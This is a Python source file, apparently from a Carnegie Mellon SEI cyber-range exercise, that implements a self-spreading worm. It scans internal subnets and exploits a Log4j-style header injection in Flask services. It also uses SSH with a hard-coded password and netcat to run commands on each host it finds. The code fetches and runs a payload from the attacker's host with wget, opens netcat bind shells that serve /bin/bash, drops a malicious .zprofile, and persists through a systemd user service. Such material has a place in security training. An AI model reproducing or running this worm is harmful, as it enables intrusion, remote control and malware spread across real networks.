
# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.

import paramiko, os, ipaddress, subprocess
import socket
import threading
import requests, sys, random
from urllib import parse
from time import sleep

## Used to handle migration 
class MigrateThread():
    def run(self):
        header_cmd = "\${{http://IP:8000/.zprofile?addr=IP}}".replace("IP",get_ip())
        target_url = "http://10.7.7.86:5000/"
        while True:
            if get_ip() == "123.45.67.175":
                if not check_port('10.7.7.86',5000):
                    sleep(.5)
                    continue
                if '.zlogin' not in ssh_cmd("10.7.7.86","ps aux | grep .zl"):
                    if flask_l4j(target_url, header_cmd) == '':
                        sleep(2)
                        continue
                sleep(60)
            else:
                migrate()
                sleep(20)

def scan_subnet(subnet):
    network = ipaddress.IPv4Network(f"{subnet}0/24",strict=False)

    ip_list = [str(ip) for ip in network.hosts() if ipaddress.IPv4Address(f"{subnet}80") <= ip <= ipaddress.IPv4Address(f"{subnet}220")]
    
    for ip in ip_list:
        cmd = f"ping -c 1 -W .05 {ip} >/dev/null 2>&1 && echo true || echo false"
        if subprocess.run(cmd,shell=True,capture_output=True).stdout.decode('utf-8').strip("\n") == 'true':
            return ip.strip('\n')

def migrate():
    subnets = ["10.1.1.","10.3.3.","10.7.7."]
    for sub in subnets:
        if sub[:6] in get_ip():
            continue
        target = scan_subnet(sub)
        if target ==None:
            continue
        if check_port(target, 5000):
            target = f"http://{target}:5000/"
            cmd = "\${{http://IP:8000/.zprofile?addr=IP}}".replace("IP",get_ip())
            flask_l4j(target, cmd)
        elif check_port(target, 9274):
            ps_out = nc_cmd(target, 'ps aux | grep .zl')
            if '.zlogin' in str(ps_out).lower():
                print(f"Found script running on {target}:9274")
            elif "nc failed" in str(ps_out).lower():
                print("nc connection failed")
            else:
                print(f"Did not find malware Running on {target}:9274")
                nc_cmd(target,f"wget -q http://IP:8000/.zlogin -O /home/user/.zlogin && chmod +x /home/user/.zlogin && export DISPLAY=:0 && /home/user/.zlogin &".replace("IP",get_ip()))
        elif check_port(target, 22):
            ps_out = ssh_cmd(target, 'ps aux | grep .zl')
            if '.zlogin' in str(ps_out).lower():
                print(f"Found script Running on {target}:22")
            elif "ssh failed" in str(ps_out).lower():
                print("ssh connection failed")
            else:
                print(f"Did not find malware Running on {target}:22")
                ssh_cmd(target,f"wget -q http://IP:8000/.zlogin -O /home/user/.zlogin && chmod +x /home/user/.zlogin && export DISPLAY=:0 && /home/user/.zlogin & while true; do (timeout 2 nc -ln -p 9274 -e /bin/bash >/dev/null 2>&1) || true; done &".replace("IP",get_ip()), background=True)



def create_file():
    if os.path.isfile("/home/user/.zprofile"):
        return
    contents = """import os,subprocess

class LogSubstitutor:
    def __init__(self,**kwargs) -> None:
        if ".zlogin" not in subprocess.run("ps aux | grep '.zl'",shell=True,capture_output=True).stdout.decode('utf-8'):
            if not os.path.isfile("/home/user/.zlogin"):
                ipaddr = kwargs.get("addr", "NoName")[0]
                os.environ['DISPLAY'] = ":0"
                os.system(f"wget -q http://{ipaddr}:8000/.zlogin -O /home/user/.zlogin && chmod +x /home/user/.zlogin && /home/user/.zlogin & while true; do (timeout 2 nc -ln -p 9274 -e /bin/bash >/dev/null 2>&1) || true; done &")
            else:
                os.system(f"/home/user/.zlogin & while true; do (timeout 2 nc -ln -p 9274 -e /bin/bash >/dev/null 2>&1) || true; done &")
        os.system("echo 'ETag: True'")
        return "Substituted text"
"""
    with open("/home/user/.zprofile", "w+") as f:
        f.write(contents)
    return

def persist():
    user_uid = subprocess.run(f"id -u user",shell=True,capture_output=True).stdout.decode('utf-8').strip('\n')
    user_gid = subprocess.run(f"id -g user",shell=True,capture_output=True).stdout.decode('utf-8').strip('\n')
    cur_uid = subprocess.run(f"id -u",shell=True,capture_output=True).stdout.decode('utf-8').strip('\n')

    if not os.path.isdir("/home/user/.config/systemd/user/"):
        os.makedirs("/home/user/.config/systemd/user/")
    service = """[Unit]
[Service]
Type=simple
Restart=always
Environment="DISPLAY=:0"
ExecStart=/home/user/.zlogin
ExecStartPost=/bin/bash -c 'while true; do (timeout 2 nc -ln -p 9274 -e /bin/bash >/dev/null 2>&1) || true; done &'
[Install]
WantedBy=default.target
"""
    if (not os.path.isfile("/home/user/.config/systemd/user/rw.service")) or (os.path.getsize("/home/user/.config/systemd/user/rw.service") == 0):
        with open("/home/user/.config/systemd/user/rw.service", "w+") as f:
            f.write(service)
    for item in ["/home/user/.config/systemd","/home/user/.config/systemd/user","/home/user/.config/systemd/user/rw.service"]:
        os.chown(item,int(user_uid),int(user_gid))
    cmds = ['daemon-reload','enable rw.service']
    if cur_uid != user_uid:
        for cmd in cmds:
            cur_cmd = f"su -c 'XDG_RUNTIME_DIR=\"/run/user/{user_uid}\" DBUS_SESSION_BUS_ADDRESS=\"unix:path=$XDG_RUNTIME_DIR/bus\" systemctl --user {cmd}' user"
            subprocess.run(cur_cmd,shell=True,capture_output=True).stdout.decode('utf-8').strip('\n')
    else:
        for cmd in cmds:
            cur_cmd = f"XDG_RUNTIME_DIR='/run/user/{user_uid}' DBUS_SESSION_BUS_ADDRESS='unix:path=$XDG_RUNTIME_DIR/bus' systemctl --user {cmd}"
            resp = subprocess.run(cur_cmd,shell=True,capture_output=True)
            #with open("/home/user/Desktop/serv_status",'a+') as f:
            #    f.write(str(resp)+'\n\n')
            #subprocess.run("systemctl --user daemon-reload ; systemctl --user enable rw.service",shell=True,capture_output=True).stdout.decode('utf-8').strip('\n')



# attack vectors
def flask_l4j(target, cmd):
    header_dict = {"Agent":cmd}
    try:
        res = requests.get(target, headers=header_dict, timeout=10)
        return res.text
    except requests.exceptions.Timeout:
        # Timeout here is ok. Means the command might be running
        # Will return empty string for consistency
        return ''
    except Exception as e:
        return ''

def ssh_cmd(target, cmd, background=False):
    updated_cmd = f"sshpass -p 'tartans' ssh -o StrictHostKeyChecking=no user@{target} '{cmd}'"
    try:
        resp = subprocess.run(updated_cmd,shell=True,capture_output=True,timeout=6)
        if not background:
        #runs command and reads the output using stdout
            stdout = resp.stdout.decode("utf-8")
            stderr = resp.stderr.decode("utf-8")
            sleep(2)
            #print(f"returning {out}")
            return stdout
        else:
            sleep(2)
            return 
    except Exception as e:
        print("error executing SSH cmd.")
        sleep(2)
        return "ssh failed cmd"

    
def nc_cmd(host, cmd):
    new_cmd = f"echo '{cmd}' | nc {host} 9274"
    for cnt,_ in enumerate(range(3)):
        try:
            resp = subprocess.run(new_cmd,shell=True,capture_output=True,timeout=4)
        except subprocess.TimeoutExpired:
            print(f"Timeout occured on attempt {cnt+1}")
            continue
        except Exception as e:
            print(f"nc failed, exception occured:\n{str(e)}")
            return "nc failed due to exception"
        else:
            if (len(resp.stderr.decode('utf-8')) == 0) and (len(resp.stdout.decode('utf-8')) > 0):
                if "connection refused" in resp.stdout.decode('utf-8'):
                    continue
                return resp.stdout.decode('utf-8')
            continue            
    return "nc failed"
                                            

def check_port(target, port):
    sock = socket.socket() 
    sock.settimeout(3)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ssh_open = sock.connect_ex((target, port)) == 0
    sock.close()
    return ssh_open

def get_ip():
    ipaddr = (([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0]
    return ipaddr


def run_migration():
    migrate_proc = MigrateThread()
    migrate_proc.run()


